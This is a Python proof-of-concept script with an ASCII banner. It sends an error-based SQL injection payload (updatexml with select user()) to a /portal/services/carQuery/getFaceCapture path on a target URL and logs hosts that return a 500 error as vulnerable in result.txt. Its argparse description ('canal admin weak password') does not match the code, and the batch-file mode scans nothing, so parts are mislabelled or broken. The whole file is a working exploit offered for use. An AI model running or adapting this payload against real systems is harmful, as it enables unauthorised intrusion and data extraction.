# -*- coding: utf-8 -*-
import argparse
import sys
import requests
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
               __     _         _           __ 
   _________ _/ /    (_)___    (_)__  _____/ /_
  / ___/ __ `/ /    / / __ \  / / _ \/ ___/ __/
 (__  ) /_/ / /    / / / / / / /  __/ /__/ /_  
/____/\__, /_/____/_/_/ /_/_/ /\___/\___/\__/  
        /_/ /_____/      /___/         
     tag :  this is a sql_inject oc
    @version:1.0.0   @author  dkop
     """
    print(test)


def poc(target):
    url =target+ "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    }
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        print(res)
        if res.status_code == 500:
            print(f"[+] {target} is vulnerable, sql_inject")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not vulnerable")
    except:
        print(f"[*] {target} server error")

def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak password')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http//www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
        print(f"我在使用-u参数  跑单个url")
    elif not args.url and args.file:
        print(f"我在使用-f参数  批量跑url")
    else:
        print(f"Usage:\n\t  python3 {sys.argv[0]}  -h")



if __name__ == '__main__':
   main()
